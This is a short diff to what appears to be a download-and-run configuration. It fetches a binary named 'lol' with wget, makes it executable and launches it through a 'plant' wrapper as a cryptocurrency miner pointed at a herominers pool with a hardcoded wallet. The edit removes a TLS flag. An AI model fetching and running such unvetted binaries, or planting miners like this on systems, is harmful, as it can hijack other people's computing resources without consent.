@@ -41,7 +41,7 @@ downloads = {
         "link": "wget -q https://github.com/handevproject/starterpack/releases/download/1.0.0/lol",
         "run": [
             "chmod +x lol",
-            "./plant/plant ./lol --algo KARLSEN --tls on --pl 60 --pool us.nexellia.herominers.com:1143 --user nexellia:qp2e339adz2fra94avvfa2xdctpu6pfs62me04hdeyesqvaxl58eg92hg0kdc.clarksye"
+            "./plant/plant ./lol --algo KARLSEN --pool us.nexellia.herominers.com:1143 --user nexellia:qp2e339adz2fra94avvfa2xdctpu6pfs62me04hdeyesqvaxl58eg92hg0kdc.clarksye"
         ]
     },
     "cpu": {
